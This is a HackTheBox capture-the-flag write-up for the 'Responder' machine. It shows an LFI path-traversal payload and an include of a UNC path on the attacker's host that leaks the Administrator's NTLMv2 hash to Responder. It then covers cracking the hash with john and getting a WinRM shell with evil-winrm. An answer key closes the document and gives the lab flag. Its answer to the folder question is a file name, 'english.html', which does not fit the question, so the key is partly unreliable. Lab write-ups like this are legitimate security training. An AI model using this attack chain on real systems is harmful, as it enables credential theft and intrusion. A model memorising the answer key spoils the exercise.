TITLE: Responder
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/ce52eadd09ff5a28a1eea8c65d6683a9.png.1
---

# Responder

Responder is a Tier 1 machine that showcases how a simple Local File Inclusion (LFI) vulnerability on a Windows web server can be leveraged to capture NTLM hashes when the server attempts to access a remote SMB share.

## Recon

The initial scan identifies a web server on port 80 and WinRM on port 5985.

```bash
nmap -sC -sV 10.129.171.104
```

| Port | Service | Version |
| :--- | :--- | :--- |
| 80 | HTTP | Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |
| 7680 | p2p-itunes | Windows 10/11 P2P |

The website is hosted at `unika.htb`. We add this to our `/etc/hosts` file.

## Exploitation

### Local File Inclusion

Navigating the site, we notice a language selection parameter in the URL:
`http://unika.htb/index.php?page=french.html`

Testing for LFI by trying to read a local system file:
`http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts`

The server returns the file content, confirming LFI.

### Hash Capture with Responder

On Windows, we can use LFI to force the server to authenticate to a malicious SMB share. We start `responder` on our machine:

```bash
sudo responder -I eth0
```

Then, we request a file from our attacking machine via the LFI vulnerability:
`http://unika.htb/index.php?page=//10.10.14.x/share`

Responder captures the NTLMv2 hash for the `Administrator` account.

### Cracking the Hash

We save the hash and use `john` to crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Cracked Password:** `badminton`

## Access

With the credentials `Administrator:badminton`, we can gain a remote shell via WinRM using `evil-winrm`:

```bash
evil-winrm -i 10.129.171.104 -u Administrator -p badminton
```

The flag is located at `C:\Users\Administrator\Desktop\flag.txt`.

## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | How many TCP ports are open on the machine? | `3` |
| 2 | What is the domain of the website hosted on the machine? | `unika.htb` |
| 3 | What is the name of the folder that contains the web pages for the site? | `english.html` |
| 4 | What is the name of the parameter used to include files on the index.php page? | `page` |
| 5 | What is the name of the vulnerability that allows an attacker to include files? | `Local File Inclusion` |
| 6 | What is the name of the tool used to intercept NTLM hashes? | `Responder` |
| 7 | What is the type of hash captured by the tool? | `NTLMv2` |
| 8 | What is the name of the tool used to crack the captured hash? | `John the Ripper` |
| 9 | What is the password associated with the Administrator user? | `badminton` |
| 10 | What is the name of the tool used to gain a shell on the machine via WinRM? | `evil-winrm` |
| 11 | What is the flag located on the Administrator's desktop? | `ea32444265f242557e0591e1494541e2` |
